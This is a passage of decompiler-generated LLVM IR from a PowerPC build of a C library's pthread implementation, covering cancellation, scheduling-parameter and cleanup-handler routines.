  %v2_100062fc = sub i32 %v1_100062f4, %v2_100062f8
  %v2_10006300 = icmp ult i32 %v2_100062fc, %v3_100062e8
  br i1 %v2_10006300, label %dec_label_pc_10006308, label %dec_label_pc_10006310

dec_label_pc_10006308:                            ; preds = %entry
  %v2_10006308 = add i32 %arg1, 20
  %v3_10006308 = inttoptr i32 %v2_10006308 to i32*
  store i32 %v2_100062fc, i32* %v3_10006308, align 4
  br label %dec_label_pc_10006310

dec_label_pc_10006310:                            ; preds = %entry, %dec_label_pc_10006308
  %v0_10006314 = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_10006308 ]
  ret i32 %v0_10006314

; uselistorder directives
  uselistorder i32 %v0_100062e4, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10006310, { 1, 0 }
}

define i32 @__GI_pthread_attr_getschedparam(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 4, i32* @r5, align 4
  %v1_10006338 = add i32 %arg1, 8
  store i32 %arg2, i32* @r3, align 4
  store i32 %v1_10006338, i32* @r4, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10006348.267 to i32), i32* @lr, align 4
  %v0_10006344 = call i32 @memcpy()
  ret i32 0
}

define i32 @__GI_pthread_attr_setschedparam(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* @r31, align 4
  store i32 %tmp, i32* %r30.global-to-local, align 4
  %v1_10006374 = add i32 %arg1, 4
  %v2_10006374 = inttoptr i32 %v1_10006374 to i32*
  %v3_10006374 = load i32, i32* %v2_10006374, align 4
  store i32 268460924, i32* @lr, align 4
  %v1_10006378 = call i32 @sched_get_priority_max(i32 %v3_10006374)
  store i32 %v1_10006378, i32* %r29.global-to-local, align 4
  %v0_10006380 = load i32, i32* @r31, align 4
  %v1_10006380 = add i32 %v0_10006380, 4
  %v2_10006380 = inttoptr i32 %v1_10006380 to i32*
  %v3_10006380 = load i32, i32* %v2_10006380, align 4
  store i32 268460936, i32* @lr, align 4
  %v1_10006384 = call i32 @sched_get_priority_min(i32 %v3_10006380)
  %v0_10006388 = load i32, i32* %r30.global-to-local, align 4
  %v1_10006388 = inttoptr i32 %v0_10006388 to i32*
  %v2_10006388 = load i32, i32* %v1_10006388, align 4
  %v2_10006390 = icmp slt i32 %v2_10006388, %v1_10006384
  br i1 %v2_10006390, label %dec_label_pc_100063b4, label %dec_label_pc_1000639c

dec_label_pc_1000639c:                            ; preds = %entry
  %v1_10006394 = load i32, i32* %r29.global-to-local, align 4
  %v3_10006394 = icmp sgt i32 %v2_10006388, %v1_10006394
  %v0_1000639c = load i32, i32* @r31, align 4
  %v1_1000639c = add i32 %v0_1000639c, 8
  store i32 %v1_1000639c, i32* @r3, align 4
  store i32 %v0_10006388, i32* @r4, align 4
  store i32 4, i32* @r5, align 4
  br i1 %v3_10006394, label %dec_label_pc_100063b4, label %dec_label_pc_100063ac

dec_label_pc_100063ac:                            ; preds = %dec_label_pc_1000639c
  store i32 ptrtoint ([3 x i8]* @global_var_100063b0.268 to i32), i32* @lr, align 4
  %v0_100063ac = call i32 @memcpy()
  br label %dec_label_pc_100063b4

dec_label_pc_100063b4:                            ; preds = %dec_label_pc_1000639c, %entry, %dec_label_pc_100063ac
  %v0_100063b8 = phi i32 [ 22, %dec_label_pc_1000639c ], [ 22, %entry ], [ 0, %dec_label_pc_100063ac ]
  ret i32 %v0_100063b8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_100063b4, { 2, 0, 1 }
}

define i32 @__GI_pthread_setcanceltype(i8 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = sext i8 %arg1 to i32
  %v3_100063cc = icmp ugt i8 %arg1, 1
  %v0_100063d0 = load i32, i32* @lr, align 4
  store i32 %v0_100063d0, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* @r11, align 4
  %v0_100063dc = load i32, i32* @r2, align 4
  store i32 %v0_100063dc, i32* %r9.global-to-local, align 4
  br i1 %v3_100063cc, label %dec_label_pc_10006430, label %dec_label_pc_100063ec

dec_label_pc_100063ec:                            ; preds = %entry
  %v3_100063ec = icmp eq i32 %arg2, 0
  br i1 %v3_100063ec, label %dec_label_pc_100063fc, label %dec_label_pc_100063f4

dec_label_pc_100063f4:                            ; preds = %dec_label_pc_100063ec
  %v1_100063f4 = add i32 %v0_100063dc, 65
  %v2_100063f4 = inttoptr i32 %v1_100063f4 to i8*
  %v3_100063f4 = load i8, i8* %v2_100063f4, align 1
  %v4_100063f4 = zext i8 %v3_100063f4 to i32
  store i32 %v4_100063f4, i32* %r0.global-to-local, align 4
  %v2_100063f8 = inttoptr i32 %arg2 to i32*
  store i32 %v4_100063f4, i32* %v2_100063f8, align 4
  %v0_100063fc.pre = load i32, i32* %r9.global-to-local, align 4
  %v0_10006400.pre = load i32, i32* @r11, align 4
  %extract.t4 = trunc i32 %v0_10006400.pre to i8
  br label %dec_label_pc_100063fc

dec_label_pc_100063fc:                            ; preds = %dec_label_pc_100063ec, %dec_label_pc_100063f4
  %v0_10006400.off0 = phi i8 [ %arg1, %dec_label_pc_100063ec ], [ %extract.t4, %dec_label_pc_100063f4 ]
  %v2_10006400 = phi i32 [ %v0_100063dc, %dec_label_pc_100063ec ], [ %v0_100063fc.pre, %dec_label_pc_100063f4 ]
  %v1_100063fc = add i32 %v2_10006400, 66
  %v2_100063fc = inttoptr i32 %v1_100063fc to i8*
  %v3_100063fc = load i8, i8* %v2_100063fc, align 1
  %v4_100063fc = zext i8 %v3_100063fc to i32
  store i32 %v4_100063fc, i32* %r0.global-to-local, align 4
  %v3_10006400 = add i32 %v2_10006400, 65
  %v4_10006400 = inttoptr i32 %v3_10006400 to i8*
  store i8 %v0_10006400.off0, i8* %v4_10006400, align 1
  %v0_10006404 = load i32, i32* %r0.global-to-local, align 4
  %v3_10006404 = icmp eq i32 %v0_10006404, 0
  br i1 %v3_10006404, label %dec_label_pc_1000642c, label %dec_label_pc_1000640c

dec_label_pc_1000640c:                            ; preds = %dec_label_pc_100063fc
  %v0_1000640c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000640c = add i32 %v0_1000640c, 64
  %v2_1000640c = inttoptr i32 %v1_1000640c to i32*
  %v3_1000640c = load i32, i32* %v2_1000640c, align 4
  store i32 %v3_1000640c, i32* %r0.global-to-local, align 4
  store i32 65536, i32* %r9.global-to-local, align 4
  %v1_10006414 = call i32 @__asm_rlwinm(i32 %v3_1000640c, i32 0, i32 0, i32 15)
  store i32 %v1_10006414, i32* %r0.global-to-local, align 4
  %v4_10006418 = icmp eq i32 %v1_10006414, 65536
  br i1 %v4_10006418, label %dec_label_pc_10006420, label %dec_label_pc_1000642c

dec_label_pc_10006420:                            ; preds = %dec_label_pc_1000640c
  %v0_10006428 = call i32 @__pthread_do_exit()
  br label %dec_label_pc_1000642c

dec_label_pc_1000642c:                            ; preds = %dec_label_pc_1000640c, %dec_label_pc_100063fc, %dec_label_pc_10006420
  br label %dec_label_pc_10006430

dec_label_pc_10006430:                            ; preds = %entry, %dec_label_pc_1000642c
  %v0_1000643c = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_1000642c ]
  store i32 %v0_100063d0, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000643c

; uselistorder directives
  uselistorder i32* %r9.global-to-local, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_10006430, { 1, 0 }
  uselistorder label %dec_label_pc_1000642c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100063fc, { 1, 0 }
}

define i32 @pthread_cancel(i32 %arg1) local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %r28.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1002abe0.262 to i32), i32* %r9.global-to-local, align 4
  %v1_1000645c = call i32 @__asm_rlwinm(i32 %arg1, i32 4, i32 18, i32 27)
  %v2_10006460 = add i32 %v1_1000645c, ptrtoint (i32* @global_var_1002abe0.262 to i32)
  store i32 %v2_10006460, i32* @r29, align 4
  store i32 %arg1, i32* %r30.global-to-local, align 4
  store i32 %v2_10006460, i32* @r3, align 4
  store i32 268461168, i32* @lr, align 4
  %v0_1000646c = call i32 @__pthread_lock()
  store i32 %v0_1000646c, i32* %r3.global-to-local, align 4
  %v0_10006470 = load i32, i32* @r29, align 4
  %v1_10006470 = add i32 %v0_10006470, 8
  %v2_10006470 = inttoptr i32 %v1_10006470 to i32*
  %v3_10006470 = load i32, i32* %v2_10006470, align 4
  store i32 %v3_10006470, i32* @r31, align 4
  %v3_10006474 = icmp eq i32 %v3_10006470, 0
  store i1 %v3_10006474, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10006474, label %dec_label_pc_10006488, label %dec_label_pc_1000647c

dec_label_pc_1000647c:                            ; preds = %entry
  %v1_1000647c = add i32 %v3_10006470, 16
  %v2_1000647c = inttoptr i32 %v1_1000647c to i32*
  %v3_1000647c = load i32, i32* %v2_1000647c, align 4
  %v0_10006480 = load i32, i32* @r30, align 4
  %v4_10006480 = icmp eq i32 %v0_10006480, %v3_1000647c
  store i1 %v4_10006480, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_10006480, label %dec_label_pc_10006498, label %dec_label_pc_10006488

dec_label_pc_10006488:                            ; preds = %dec_label_pc_1000647c, %entry
  store i32 %v0_10006470, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10006490.270 to i32), i32* @lr, align 4
  %v0_1000648c = call i32 @__pthread_unlock()
  br label %dec_label_pc_10006524

dec_label_pc_10006498:                            ; preds = %dec_label_pc_1000647c
  %v1_10006498 = add i32 %v3_10006470, 64
  %v2_10006498 = inttoptr i32 %v1_10006498 to i8*
  %v3_10006498 = load i8, i8* %v2_10006498, align 1
  %v1_1000649c = add i32 %v3_10006470, 66
  %v2_1000649c = inttoptr i32 %v1_1000649c to i8*
  %v3_1000649c = load i8, i8* %v2_1000649c, align 1
  %v4_1000649c = zext i8 %v3_1000649c to i32
  store i32 %v4_1000649c, i32* %r9.global-to-local, align 4
  %v3_100064a0 = icmp eq i8 %v3_10006498, 1
  store i1 %v3_100064a0, i1* %cr7_eq.global-to-local, align 1
  store i8 1, i8* %v2_1000649c, align 1
  %v0_100064ac = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_100064ac, label %dec_label_pc_100064b8, label %dec_label_pc_100064b0

dec_label_pc_100064b0:                            ; preds = %dec_label_pc_10006498
  %v0_100064b0 = load i32, i32* %r9.global-to-local, align 4
  %v3_100064b0 = icmp eq i32 %v0_100064b0, 0
  store i1 %v3_100064b0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100064b0, label %dec_label_pc_100064c4, label %dec_label_pc_100064b8

dec_label_pc_100064b8:                            ; preds = %dec_label_pc_100064b0, %dec_label_pc_10006498
  %v0_100064b8 = load i32, i32* @r29, align 4
  store i32 %v0_100064b8, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_100064c0.271 to i32), i32* @lr, align 4
  %v0_100064bc = call i32 @__pthread_unlock()
  store i32 %v0_100064bc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006524

dec_label_pc_100064c4:                            ; preds = %dec_label_pc_100064b0
  %v0_100064c4 = load i32, i32* @r31, align 4
  %v1_100064c4 = add i32 %v0_100064c4, 444
  %v2_100064c4 = inttoptr i32 %v1_100064c4 to i32*
  %v3_100064c4 = load i32, i32* %v2_100064c4, align 4
  store i32 %v3_100064c4, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r30.global-to-local, align 4
  %v1_100064cc = add i32 %v0_100064c4, 20
  %v2_100064cc = inttoptr i32 %v1_100064cc to i32*
  %v3_100064cc = load i32, i32* %v2_100064cc, align 4
  store i32 %v3_100064cc, i32* %r28.global-to-local, align 4
  %v3_100064d0 = icmp eq i32 %v3_100064c4, 0
  store i1 %v3_100064d0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100064d0, label %dec_label_pc_100064f4, label %dec_label_pc_100064d8

dec_label_pc_100064d8:                            ; preds = %dec_label_pc_100064c4
  %v1_100064d8 = inttoptr i32 %v3_100064c4 to i32*
  %v2_100064d8 = load i32, i32* %v1_100064d8, align 4
  store i32 %v2_100064d8, i32* %r3.global-to-local, align 4
  %v1_100064e0 = add i32 %v3_100064c4, 4
  %v2_100064e0 = inttoptr i32 %v1_100064e0 to i32*
  %v3_100064e0 = load i32, i32* %v2_100064e0, align 4
  store i32 %v3_100064e0, i32* %r9.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_100064e0)
  %v1_100064ec = trunc i32 %v2_100064d8 to i8
  %v2_100064ec = load i32, i32* @r31, align 4
  %v3_100064ec = add i32 %v2_100064ec, 440
  %v4_100064ec = inttoptr i32 %v3_100064ec to i8*
  store i8 %v1_100064ec, i8* %v4_100064ec, align 1
  %v0_100064f0 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_100064f0, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_100064f4

dec_label_pc_100064f4:                            ; preds = %dec_label_pc_100064c4, %dec_label_pc_100064d8
  %v0_100064f4 = load i32, i32* @r29, align 4
  store i32 %v0_100064f4, i32* @r3, align 4
  store i32 268461308, i32* @lr, align 4
  %v0_100064f8 = call i32 @__pthread_unlock()
  store i32 %v0_100064f8, i32* %r3.global-to-local, align 4
  %v0_100064fc = load i32, i32* %r30.global-to-local, align 4
  %v3_100064fc = icmp eq i32 %v0_100064fc, 0
  store i1 %v3_100064fc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_100064fc, label %dec_label_pc_10006510, label %dec_label_pc_10006504

dec_label_pc_10006504:                            ; preds = %dec_label_pc_100064f4
  %v0_10006504 = load i32, i32* @r31, align 4
  store i32 %v0_10006504, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1000650c.272 to i32), i32* @lr, align 4
  %v0_10006508 = call i32 @__pthread_restart_new()
  store i32 %v0_10006508, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006524

dec_label_pc_10006510:                            ; preds = %dec_label_pc_100064f4
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* %r9.global-to-local, align 4
  %v0_10006514 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10006514, i32* %r3.global-to-local, align 4
  %v3_10006518 = load i32, i32* @global_var_1002ef58.229, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10006520.273 to i32), i32* @lr, align 4
  %v2_1000651c = call i32 @kill(i32 %v0_10006514, i32 %v3_10006518)
  store i32 %v2_1000651c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006524

dec_label_pc_10006524:                            ; preds = %dec_label_pc_10006510, %dec_label_pc_100064b8, %dec_label_pc_10006504, %dec_label_pc_10006488
  %storemerge = phi i32 [ 3, %dec_label_pc_10006488 ], [ 0, %dec_label_pc_10006504 ], [ 0, %dec_label_pc_100064b8 ], [ 0, %dec_label_pc_10006510 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_100064c4, { 1, 0, 2, 3 }
  uselistorder i32 %v3_10006470, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r30.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10006524, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_100064f4, { 1, 0 }
}

define i32 @pthread_setcancelstate(i8 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = sext i8 %arg1 to i32
  %v3_10006538 = icmp ugt i8 %arg1, 1
  %v0_1000653c = load i32, i32* @lr, align 4
  store i32 %v0_1000653c, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* %r11.global-to-local, align 4
  %v0_10006548 = load i32, i32* @r2, align 4
  store i32 %v0_10006548, i32* %r9.global-to-local, align 4
  br i1 %v3_10006538, label %dec_label_pc_1000659c, label %dec_label_pc_10006558

dec_label_pc_10006558:                            ; preds = %entry
  %v3_10006558 = icmp eq i32 %arg2, 0
  br i1 %v3_10006558, label %dec_label_pc_10006568, label %dec_label_pc_10006560

dec_label_pc_10006560:                            ; preds = %dec_label_pc_10006558
  %v1_10006560 = add i32 %v0_10006548, 64
  %v2_10006560 = inttoptr i32 %v1_10006560 to i8*
  %v3_10006560 = load i8, i8* %v2_10006560, align 1
  %v4_10006560 = zext i8 %v3_10006560 to i32
  store i32 %v4_10006560, i32* %r0.global-to-local, align 4
  %v2_10006564 = inttoptr i32 %arg2 to i32*
  store i32 %v4_10006560, i32* %v2_10006564, align 4
  %v0_10006568.pre = load i32, i32* %r9.global-to-local, align 4
  %v0_1000656c.pre = load i32, i32* %r11.global-to-local, align 4
  %extract.t4 = trunc i32 %v0_1000656c.pre to i8
  br label %dec_label_pc_10006568

dec_label_pc_10006568:                            ; preds = %dec_label_pc_10006558, %dec_label_pc_10006560
  %v0_1000656c.off0 = phi i8 [ %arg1, %dec_label_pc_10006558 ], [ %extract.t4, %dec_label_pc_10006560 ]
  %v2_1000656c = phi i32 [ %v0_10006548, %dec_label_pc_10006558 ], [ %v0_10006568.pre, %dec_label_pc_10006560 ]
  %v1_10006568 = add i32 %v2_1000656c, 66
  %v2_10006568 = inttoptr i32 %v1_10006568 to i8*
  %v3_10006568 = load i8, i8* %v2_10006568, align 1
  %v4_10006568 = zext i8 %v3_10006568 to i32
  store i32 %v4_10006568, i32* %r0.global-to-local, align 4
  %v3_1000656c = add i32 %v2_1000656c, 64
  %v4_1000656c = inttoptr i32 %v3_1000656c to i8*
  store i8 %v0_1000656c.off0, i8* %v4_1000656c, align 1
  %v0_10006570 = load i32, i32* %r0.global-to-local, align 4
  %v3_10006570 = icmp eq i32 %v0_10006570, 0
  br i1 %v3_10006570, label %dec_label_pc_10006598, label %dec_label_pc_10006578

dec_label_pc_10006578:                            ; preds = %dec_label_pc_10006568
  %v0_10006578 = load i32, i32* %r9.global-to-local, align 4
  %v1_10006578 = add i32 %v0_10006578, 64
  %v2_10006578 = inttoptr i32 %v1_10006578 to i32*
  %v3_10006578 = load i32, i32* %v2_10006578, align 4
  store i32 %v3_10006578, i32* %r0.global-to-local, align 4
  store i32 65536, i32* %r9.global-to-local, align 4
  %v1_10006580 = call i32 @__asm_rlwinm(i32 %v3_10006578, i32 0, i32 0, i32 15)
  store i32 %v1_10006580, i32* %r0.global-to-local, align 4
  %v4_10006584 = icmp eq i32 %v1_10006580, 65536
  br i1 %v4_10006584, label %dec_label_pc_1000658c, label %dec_label_pc_10006598

dec_label_pc_1000658c:                            ; preds = %dec_label_pc_10006578
  %v0_10006594 = call i32 @__pthread_do_exit()
  br label %dec_label_pc_10006598

dec_label_pc_10006598:                            ; preds = %dec_label_pc_10006578, %dec_label_pc_10006568, %dec_label_pc_1000658c
  br label %dec_label_pc_1000659c

dec_label_pc_1000659c:                            ; preds = %entry, %dec_label_pc_10006598
  %v0_100065a8 = phi i32 [ 22, %entry ], [ 0, %dec_label_pc_10006598 ]
  store i32 %v0_1000653c, i32* %r0.global-to-local, align 4
  ret i32 %v0_100065a8

; uselistorder directives
  uselistorder i32* %r9.global-to-local, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1000659c, { 1, 0 }
  uselistorder label %dec_label_pc_10006598, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10006568, { 1, 0 }
}

define i32 @__pthread_perform_cleanup(i32 %arg1) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v0_100065b8 = load i32, i32* @r2, align 4
  store i32 %v0_100065b8, i32* %r30.global-to-local, align 4
  store i32 %arg1, i32* %r29.global-to-local, align 4
  %v1_100065c4 = add i32 %v0_100065b8, 60
  br label %dec_label_pc_100065e4

dec_label_pc_100065d0:                            ; preds = %dec_label_pc_100065e4
  %v1_100065d0 = inttoptr i32 %storemerge to i32*
  %v2_100065d0 = load i32, i32* %v1_100065d0, align 4
  %v1_100065d4 = add i32 %storemerge, 4
  %v2_100065d4 = inttoptr i32 %v1_100065d4 to i32*
  %v3_100065d4 = load i32, i32* %v2_100065d4, align 4
  store i32 %v3_100065d4, i32* %r3.global-to-local, align 4
  call void @__pseudo_call(i32 %v2_100065d0)
  %v0_100065e0 = load i32, i32* @r31, align 4
  %v1_100065e0 = add i32 %v0_100065e0, 12
  %v1_100065e8.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_100065e4

dec_label_pc_100065e4:                            ; preds = %entry, %dec_label_pc_100065d0
  %v1_100065e8 = phi i32 [ %arg1, %entry ], [ %v1_100065e8.pre, %dec_label_pc_100065d0 ]
  %storemerge.in.in = phi i32 [ %v1_100065c4, %entry ], [ %v1_100065e0, %dec_label_pc_100065d0 ]
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* @r31, align 4
  %v3_100065e4 = icmp eq i32 %storemerge, 0
  %tmp5 = icmp ule i32 %storemerge, %v1_100065e8
  %or.cond = or i1 %tmp5, %v3_100065e4
  br i1 %or.cond, label %dec_label_pc_100065f0, label %dec_label_pc_100065d0

dec_label_pc_100065f0:                            ; preds = %dec_label_pc_100065e4
  %v0_100065f0 = load i32, i32* %r30.global-to-local, align 4
  %v1_100065f0 = add i32 %v0_100065f0, 372
  %v2_100065f0 = inttoptr i32 %v1_100065f0 to i32*
  %v3_100065f0 = load i32, i32* %v2_100065f0, align 4
  %v3_100065f4 = icmp eq i32 %v3_100065f0, 0
  br i1 %v3_100065f4, label %dec_label_pc_100065f0.dec_label_pc_10006600_crit_edge, label %dec_label_pc_100065fc

dec_label_pc_100065f0.dec_label_pc_10006600_crit_edge: ; preds = %dec_label_pc_100065f0
  %v0_10006610.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006600

dec_label_pc_100065fc:                            ; preds = %dec_label_pc_100065f0
  store i32 268461568, i32* @lr, align 4
  %v0_100065fc = call i32 @__rpc_thread_destroy()
  store i32 %v0_100065fc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10006600

dec_label_pc_10006600:                            ; preds = %dec_label_pc_100065f0.dec_label_pc_10006600_crit_edge, %dec_label_pc_100065fc
  %v0_10006610 = phi i32 [ %v0_10006610.pre, %dec_label_pc_100065f0.dec_label_pc_10006600_crit_edge ], [ %v0_100065fc, %dec_label_pc_100065fc ]
  ret i32 %v0_10006610

; uselistorder directives
  uselistorder i32 %storemerge, { 2, 3, 4, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10006600, { 1, 0 }
  uselistorder label %dec_label_pc_100065e4, { 1, 0 }
}

define i32 @__pthread_cleanup_pop_restore() local_unnamed_addr {
entry:
  %cr7_eq.global-to-local = alloca i1, align 1
  %r9.global-to-local = alloca i32, align 4
  %v0_10006614 = load i32, i32* @r4, align 4
  %v3_10006614 = icmp eq i32 %v0_10006614, 0
  store i1 %v3_10006614, i1* %cr7_eq.global-to-local, align 1
  %v0_10006624 = load i32, i32* @r3, align 4
  store i32 %v0_10006624, i32* @r31, align 4
  %v0_1000662c = load i32, i32* @r2, align 4
  store i32 %v0_1000662c, i32* @r30, align 4
  br i1 %v3_10006614, label %dec_label_pc_10006644, label %dec_label_pc_10006634

dec_label_pc_10006634:                            ; preds = %entry
  %v1_10006640 = call i32 @unknown_0()
  store i32 %v1_10006640, i32* @r3, align 4
  %v0_10006644.pre = load i32, i32* @r31, align 4
  %v0_10006648.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10006644

dec_label_pc_10006644:                            ; preds = %entry, %dec_label_pc_10006634
  %v1_1000664c = phi i32 [ %v0_1000662c, %entry ], [ %v0_10006648.pre, %dec_label_pc_10006634 ]
  %v0_10006644 = phi i32 [ %v0_10006624, %entry ], [ %v0_10006644.pre, %dec_label_pc_10006634 ]
  %v1_10006644 = add i32 %v0_10006644, 12
  %v2_10006644 = inttoptr i32 %v1_10006644 to i32*
  %v3_10006644 = load i32, i32* %v2_10006644, align 4
  %v1_10006648 = add i32 %v1_1000664c, 66
  %v2_10006648 = inttoptr i32 %v1_10006648 to i8*
  %v3_10006648 = load i8, i8* %v2_10006648, align 1
  %v4_10006648 = zext i8 %v3_10006648 to i32
  store i32 %v4_10006648, i32* %r9.global-to-local, align 4
  %v2_1000664c = add i32 %v1_1000664c, 60
  %v3_1000664c = inttoptr i32 %v2_1000664c to i32*
  store i32 %v3_10006644, i32* %v3_1000664c, align 4
  %v0_10006650 = load i32, i32* %r9.global-to-local, align 4
  %v3_10006650 = icmp eq i32 %v0_10006650, 0
  store i1 %v3_10006650, i1* %cr7_eq.global-to-local, align 1
  %v0_10006654 = load i32, i32* @r31, align 4
  %v1_10006654 = add i32 %v0_10006654, 8
  %v2_10006654 = inttoptr i32 %v1_10006654 to i32*
  %v3_10006654 = load i32, i32* %v2_10006654, align 4
  %v1_10006658 = trunc i32 %v3_10006654 to i8
  %v2_10006658 = load i32, i32* @r30, align 4
  %v3_10006658 = add i32 %v2_10006658, 65
  %v4_10006658 = inttoptr i32 %v3_10006658 to i8*
  store i8 %v1_10006658, i8* %v4_10006658, align 1
  %v0_1000665c = load i1, i1* %cr7_eq.global-to-local, align 1
  br i1 %v0_1000665c, label %dec_label_pc_10006680, label %dec_label_pc_10006660

dec_label_pc_10006660:                            ; preds = %dec_label_pc_10006644
  %v0_10006660 = load i32, i32* @r30, align 4
  %v1_10006660 = add i32 %v0_10006660, 64
  %v2_10006660 = inttoptr i32 %v1_10006660 to i32*
  %v3_10006660 = load i32, i32* %v2_10006660, align 4
  store i32 65536, i32* %r9.global-to-local, align 4
  %v1_10006668 = call i32 @__asm_rlwinm(i32 %v3_10006660, i32 0, i32 0, i32 15)
  %v4_1000666c = icmp eq i32 %v1_10006668, 65536
  store i1 %v4_1000666c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v4_1000666c, label %dec_label_pc_10006674, label %dec_label_pc_10006680

dec_label_pc_10006674:                            ; preds = %dec_label_pc_10006660
  %v0_1000667c = call i32 @__pthread_do_exit()
  store i32 %v0_1000667c, i32* @r3, align 4
  br label %dec_label_pc_10006680

dec_label_pc_10006680:                            ; preds = %dec_label_pc_10006660, %dec_label_pc_10006644, %dec_label_pc_10006674
  %v0_10006690 = load i32, i32* @r3, align 4
  ret i32 %v0_10006690

; uselistorder directives
  uselistorder label %dec_label_pc_10006680, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10006644, { 1, 0 }
}

define i32 @__pthread_cleanup_push_defer(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %arg1, align 4
  %v0_10006698 = load i32, i32* @r2, align 4
  store i32 %v0_10006698, i32* %r9.global-to-local, align 4
  %v2_1000669c = add i32 %tmp, 4
  %v3_1000669c = inttoptr i32 %v2_1000669c to i32*
  store i32 %arg3, i32* %v3_1000669c, align 4
  %v0_100066a0 = load i32, i32* @r2, align 4
  %v1_100066a0 = add i32 %v0_100066a0, 65
  %v2_100066a0 = inttoptr i32 %v1_100066a0 to i8*
  %v3_100066a0 = load i8, i8* %v2_100066a0, align 1
  %v4_100066a0 = zext i8 %v3_100066a0 to i32
  store i32 %v4_100066a0, i32* %r0.global-to-local, align 4
  %v2_100066a4 = add i32 %tmp, 8
  %v3_100066a4 = inttoptr i32 %v2_100066a4 to i32*
  store i32 %v4_100066a0, i32* %v3_100066a4, align 4
  %v0_100066a8 = load i32, i32* @r2, align 4
  %v1_100066a8 = add i32 %v0_100066a8, 60
  %v2_100066a8 = inttoptr i32 %v1_100066a8 to i32*
  %v3_100066a8 = load i32, i32* %v2_100066a8, align 4
  store i32 %v3_100066a8, i32* %r0.global-to-local, align 4
  %v2_100066b4 = add i32 %tmp, 12
  %v3_100066b4 = inttoptr i32 %v2_100066b4 to i32*
  store i32 %v3_100066a8, i32* %v3_100066b4, align 4
  %tmp1 = add i32 %v3_100066a8, -1
  %tmp2 = icmp ult i32 %tmp1, %tmp
  br i1 %tmp2, label %dec_label_pc_100066c0, label %dec_label_pc_100066c8

dec_label_pc_100066c0:                            ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %v3_100066b4, align 4
  br label %dec_label_pc_100066c8

dec_label_pc_100066c8:                            ; preds = %entry, %dec_label_pc_100066c0
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_100066cc = load i32, i32* %r9.global-to-local, align 4
  %v2_100066cc = add i32 %v1_100066cc, 60
  %v3_100066cc = inttoptr i32 %v2_100066cc to i32*
  store i32 %tmp, i32* %v3_100066cc, align 4
